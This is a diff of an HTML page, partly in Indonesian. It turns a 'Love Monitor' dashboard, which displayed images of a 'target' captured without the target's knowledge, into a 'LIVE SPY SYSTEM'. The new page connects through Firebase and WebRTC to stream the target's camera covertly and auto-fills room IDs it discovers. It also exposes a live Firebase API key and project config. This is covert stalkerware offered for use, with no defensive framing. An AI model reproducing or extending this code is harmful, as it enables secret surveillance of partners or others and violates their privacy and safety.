@@ -1,336 +1,61 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💌 Love Monitor</title>
+    <title>🕵️‍♂️ Love Monitor</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
         body {
-            font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #1a1a2e, #16213e);
-            color: #fff;
-            min-height: 100vh;
-        }
-        
-        .container {
-            max-width: 1200px;
-            margin: 0 auto;
+            margin: 0;
             padding: 20px;
+            background: black;
+            color: lime;
+            font-family: monospace;
         }
-        
-        header {
-            text-align: center;
-            padding: 30px 0;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            margin-bottom: 30px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-        
-        .logo {
-            font-size: 2.5rem;
-            color: #ff4081;
-            margin-bottom: 10px;
-        }
-        
-        .subtitle {
-            color: #aaa;
-            font-style: italic;
-        }
-        
-        .dashboard {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
-            gap: 25px;
-            margin-bottom: 30px;
-        }
-        
-        .card {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 15px;
-            padding: 25px;
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            transition: transform 0.3s;
-        }
-        
-        .card:hover {
-            transform: translateY(-5px);
-            border-color: rgba(255, 64, 129, 0.3);
-        }
-        
-        .card-title {
-            color: #ff4081;
-            margin-bottom: 20px;
-            font-size: 1.3rem;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .card-title i {
-            font-size: 1.2rem;
-        }
-        
-        .live-feed-container {
-            text-align: center;
-        }
-        
-        #love-image {
+        #remoteVideo {
             width: 100%;
-            max-width: 500px;
-            border-radius: 10px;
-            border: 3px solid #ff4081;
-            margin: 15px auto;
-            display: block;
-            background: #000;
-            min-height: 300px;
+            max-width: 600px;
+            border: 3px solid red;
+            margin: 20px 0;
         }
-        
-        .stats-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 15px;
-            margin-top: 20px;
-        }
-        
-        .stat-item {
-            background: rgba(255, 255, 255, 0.08);
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-        }
-        
-        .stat-value {
-            font-size: 1.8rem;
-            font-weight: bold;
-            color: #ff4081;
-            display: block;
-        }
-        
-        .stat-label {
-            font-size: 0.9rem;
-            color: #aaa;
-        }
-        
-        .love-log {
-            max-height: 300px;
-            overflow-y: auto;
-            background: rgba(0, 0, 0, 0.3);
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 15px;
-        }
-        
-        .log-entry {
+        #roomInput {
             padding: 10px;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
-            font-size: 0.9rem;
+            width: 300px;
+            margin: 10px;
         }
-        
-        .log-entry:last-child {
-            border-bottom: none;
-        }
-        
-        .log-time {
-            color: #ff4081;
-            font-size: 0.8rem;
-        }
-        
-        .log-message {
-            margin-top: 5px;
-        }
-        
-        .controls {
-            display: flex;
-            gap: 10px;
-            margin-top: 20px;
-            flex-wrap: wrap;
-        }
-        
-        .control-btn {
-            background: rgba(255, 64, 129, 0.2);
+        #connectBtn {
+            background: red;
             color: white;
-            border: 1px solid #ff4081;
+            border: none;
             padding: 10px 20px;
-            border-radius: 8px;
             cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            gap: 8px;
         }
-        
-        .control-btn:hover {
-            background: #ff4081;
-            transform: translateY(-2px);
-        }
-        
-        .emotion-display {
-            font-size: 1.5rem;
-            text-align: center;
-            margin: 15px 0;
-            color: #ffcc00;
-            min-height: 40px;
-        }
-        
-        .love-meter {
-            height: 20px;
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 10px;
-            margin: 15px 0;
-            overflow: hidden;
-        }
-        
-        .love-fill {
-            height: 100%;
-            background: linear-gradient(to right, #ff4081, #c779d0);
-            border-radius: 10px;
-            width: 50%;
-            transition: width 1s;
-        }
-        
-        .status-indicator {
-            display: inline-block;
-            width: 10px;
-            height: 10px;
-            border-radius: 50%;
-            margin-right: 10px;
-            animation: pulse 2s infinite;
-        }
-        
-        .online {
-            background: #4CAF50;
-        }
-        
-        .offline {
-            background: #f44336;
-        }
-        
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
-        }
-        
-        footer {
-            text-align: center;
-            margin-top: 40px;
-            padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.1);
-            color: #666;
-            font-size: 0.9rem;
-        }
-        
-        .secret-note {
-            background: rgba(255, 64, 129, 0.1);
-            border-left: 3px solid #ff4081;
-            padding: 15px;
-            border-radius: 0 10px 10px 0;
-            margin-top: 20px;
-            font-size: 0.9rem;
+        .log {
+            background: #111;
+            padding: 10px;
+            margin: 10px 0;
+            font-size: 12px;
         }
     </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <div class="container">
-        <header>
-            <div class="logo">
-                <i class="fas fa-heart"></i> Love Monitor <i class="fas fa-heart"></i>
-            </div>
-            <p class="subtitle">Memantau setiap detik kebahagiaan dan senyumannya</p>
-        </header>
-        
-        <div class="dashboard">
-            <div class="card">
-                <h2 class="card-title"><i class="fas fa-camera"></i> Live Senyuman</h2>
-                <div class="live-feed-container">
-                    <img id="love-image" src="" alt="Live Feed">
-                    <div class="emotion-display" id="emotion-display">
-                        Menunggu senyuman...
-                    </div>
-                    <div class="love-meter">
-                        <div class="love-fill" id="love-fill"></div>
-                    </div>
-                    <p>Tingkat Cinta: <span id="love-percent">50%</span></p>
-                </div>
-            </div>
-            
-            <div class="card">
-                <h2 class="card-title"><i class="fas fa-chart-line"></i> Statistik Cinta</h2>
-                <div class="stats-grid">
-                    <div class="stat-item">
-                        <span class="stat-value" id="total-moments">0</span>
-                        <span class="stat-label">Momen Terekam</span>
-                    </div>
-                    <div class="stat-item">
-                        <span class="stat-value" id="session-time">0</span>
-                        <span class="stat-label">Detik Bersama</span>
-                    </div>
-                    <div class="stat-item">
-                        <span class="stat-value" id="last-emotion">-</span>
-                        <span class="stat-label">Emosi Terakhir</span>
-                    </div>
-                    <div class="stat-item">
-                        <span class="stat-value"><span class="status-indicator online"></span></span>
-                        <span class="stat-label">Status</span>
-                    </div>
-                </div>
-                
-                <div class="controls">
-                    <button class="control-btn" onclick="saveCurrentImage()">
-                        <i class="fas fa-save"></i> Simpan Gambar
-                    </button>
-                    <button class="control-btn" onclick="refreshFeed()">
-                        <i class="fas fa-sync-alt"></i> Refresh
-                    </button>
-                </div>
-                
-                <div class="secret-note">
-                    <i class="fas fa-lock"></i> Sistem memantau aktifitas dengan aman tanpa sepengetahuan target.
-                </div>
-            </div>
-            
-            <div class="card">
-                <h2 class="card-title"><i class="fas fa-history"></i> Log Kenangan</h2>
-                <div class="love-log" id="love-log">
-                    <!-- Log entries will appear here -->
-                </div>
-            </div>
-            
-            <div class="card">
-                <h2 class="card-title"><i class="fas fa-user"></i> Info Target</h2>
-                <div id="target-info">
-                    <p><i class="fas fa-clock"></i> Terhubung: <span id="connected-time">--:--:--</span></p>
-                    <p><i class="fas fa-desktop"></i> Perangkat: <span id="device-info">Loading...</span></p>
-                    <p><i class="fas fa-map-marker-alt"></i> Lokasi: <span id="location-info">Tidak terlacak</span></p>
-                    <p><i class="fas fa-heartbeat"></i> Aktivitas: <span id="activity-status">Aktif</span></p>
-                </div>
-                
-                <h3 style="margin-top: 20px; color: #ff4081;">Momen Terbaru</h3>
-                <div id="recent-moments">
-                    <!-- Recent moments will appear here -->
-                </div>
-            </div>
-        </div>
-        
-        <footer>
-            <p><i class="fas fa-code-heart"></i> Love Monitor v2.0 - Untuk pengawasan penuh kasih sayang</p>
-            <p style="margin-top: 10px; color: #ff4081;">"Setiap senyuman adalah kenangan yang berharga"</p>
-        </footer>
+    <h1>🔴 LIVE SPY SYSTEM</h1>
+    
+    <div>
+        <input type="text" id="roomInput" placeholder="Room ID dari target">
+        <button id="connectBtn" onclick="connectToTarget()">🎯 CONNECT</button>
     </div>
     
-    <!-- Firebase SDK -->
+    <video id="remoteVideo" autoplay playsinline></video>
+    
+    <div id="status">🟡 Waiting for connection...</div>
+    
+    <div class="log" id="log"></div>
+
+    <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js"></script>
     
     <script>
-        // ================= FIREBASE CONFIG =================
+        // =============== FIREBASE ===============
         const firebaseConfig = {
             apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
             authDomain: "survei-f11a1.firebaseapp.com",
@@ -341,69 +66,134 @@
             appId: "1:769641850914:web:3be7b2cf7f6cb09ab9427b"
         };
         
-        // Initialize Firebase
         firebase.initializeApp(firebaseConfig);
-        const database = firebase.database();
+        const db = firebase.database();
         
-        // ================= MONITORING SYSTEM =================
-        let totalMoments = 0;
-        let lastUpdateTime = Date.now();
+        // =============== WEBRTC VARIABLES ===============
+        let peerConnection;
+        let roomId;
         
-        function startLoveMonitoring() {
-            // Monitor love moments (images)
-            database.ref('love_diary/moments').limitToLast(1).on('value', (snapshot) => {
-                const data = snapshot.val();
-                if (data) {
-                    const key = Object.keys(data)[0];
-                    const moment = data[key];
-                    
-                    // Update live feed
-                    const loveImage = document.getElementById('love-image');
-                    loveImage.src = moment.image;
-                    
-                    // Update emotion display
-                    const emotionDisplay = document.getElementById('emotion-display');
-                    emotionDisplay.textContent = `Emosi: ${moment.emotion || 'Bahagia'}`;
-                    emotionDisplay.style.color = getEmotionColor(moment.emotion);
-                    
-                    // Update love meter
-                    const lovePercent = moment.loveLevel || 50;
-                    document.getElementById('love-percent').textContent = `${lovePercent}%`;
-                    document.getElementById('love-fill').style.width = `${lovePercent}%`;
-                    
-                    // Update stats
-                    totalMoments++;
-                    document.getElementById('total-moments').textContent = totalMoments;
-                    document.getElementById('last-emotion').textContent = moment.emotion || '-';
-                    
-                    // Update last update time
-                    lastUpdateTime = Date.now();
-                    const timeStr = new Date(moment.timestamp).toLocaleTimeString();
-                    document.getElementById('connected-time').textContent = timeStr;
-                    
-                    // Add to log
-                    addLoveLog(`❤️ Momen ${moment.emotion} terekam`, moment.timestamp);
-                    
-                    // Update recent moments
-                    updateRecentMoments();
+        // =============== CONNECT TO TARGET ===============
+        async function connectToTarget() {
+            roomId = document.getElementById('roomInput').value.trim();
+            if (!roomId) {
+                log("❌ Masukkan Room ID!");
+                return;
+            }
+            
+            log("🔗 Connecting to room: " + roomId);
+            
+            try {
+                // 1. CHECK IF ROOM EXISTS
+                const snapshot = await db.ref('rooms/' + roomId).once('value');
+                if (!snapshot.exists()) {
+                    log("❌ Room tidak ditemukan!");
+                    return;
+                }
+                
+                // 2. SETUP WEBRTC
+                setupWebRTC();
+                
+                // 3. CREATE AND SEND OFFER
+                const offer = await peerConnection.createOffer();
+                await peerConnection.setLocalDescription(offer);
+                
+                // Send offer to target
+                await db.ref('rooms/' + roomId + '/offer').set(offer);
+                
+                log("📤 Offer sent to target...");
+                
+                // 4. LISTEN FOR ANSWER
+                listenForAnswer();
+                
+                // 5. LISTEN FOR TARGET'S ICE CANDIDATES
+                listenForTargetCandidates();
+                
+            } catch (err) {
+                log("❌ Error: " + err.message);
+            }
+        }
+        
+        // =============== WEBRTC SETUP ===============
+        function setupWebRTC() {
+            const config = {
+                iceServers: [
+                    { urls: 'stun:stun.l.google.com:19302' },
+                    { urls: 'stun:stun1.l.google.com:19302' }
+                ]
+            };
+            
+            peerConnection = new RTCPeerConnection(config);
+            
+            // Handle incoming stream
+            peerConnection.ontrack = (event) => {
+                log("🎥 Stream received!");
+                const remoteVideo = document.getElementById('remoteVideo');
+                remoteVideo.srcObject = event.streams[0];
+                document.getElementById('status').textContent = "🟢 LIVE STREAM ACTIVE";
+            };
+            
+            // ICE Candidate handler
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    db.ref('rooms/' + roomId + '/candidates/spy').push({
+                        candidate: event.candidate
+                    });
+                }
+            };
+            
+            // Connection state
+            peerConnection.onconnectionstatechange = () => {
+                log("Connection state: " + peerConnection.connectionState);
+            };
+        }
+        
+        // =============== LISTEN FOR ANSWER ===============
+        function listenForAnswer() {
+            db.ref('rooms/' + roomId + '/answer').on('value', async (snapshot) => {
+                const answer = snapshot.val();
+                if (answer && peerConnection.signalingState !== 'stable') {
+                    log("📥 Answer received!");
+                    await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
                 }
             });
-            
-            // Monitor connections
-            database.ref('love_diary/connections').limitToLast(5).on('value', (snapshot) => {
+        }
+        
+        // =============== LISTEN FOR TARGET CANDIDATES ===============
+        function listenForTargetCandidates() {
+            db.ref('rooms/' + roomId + '/candidates/target').on('child_added', async (snapshot) => {
                 const data = snapshot.val();
-                if (data) {
-                    const connections = Object.values(data);
-                    const latest = connections[connections.length - 1];
-                    
-                    if (latest) {
-                        document.getElementById('device-info').textContent = latest.device || 'Unknown';
-                        
-                        let activityText = 'Aktif';
-                        if (latest.event === 'LOVE_SESSION_ENDED') {
-                            activityText = 'Tidak aktif';
-                        }
-                        document.getElementById('activity-status').textContent = activityText;
-                        
-                        // Add connection log
-                        if (latest.event === 'LOVE_CAMERA_ACTIV
+                if (data && data.candidate) {
+                    try {
+                        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
+                        log("✅ ICE candidate added");
+                    } catch (e) {
+                        log("❌ ICE error: " + e.message);
+                    }
+                }
+            });
+        }
+        
+        // =============== UTILS ===============
+        function log(message) {
+            const logDiv = document.getElementById('log');
+            const entry = document.createElement('div');
+            entry.textContent = new Date().toLocaleTimeString() + " - " + message;
+            logDiv.appendChild(entry);
+            logDiv.scrollTop = logDiv.scrollHeight;
+        }
+        
+        // =============== AUTO-DISCOVER ROOMS ===============
+        db.ref('rooms').on('value', (snapshot) => {
+            const rooms = snapshot.val();
+            if (rooms) {
+                const roomList = Object.keys(rooms);
+                if (roomList.length > 0) {
+                    document.getElementById('roomInput').value = roomList[0];
+                    log("🔍 Found room: " + roomList[0]);
+                }
+            }
+        });
+    </script>
+</body>
+    </html>
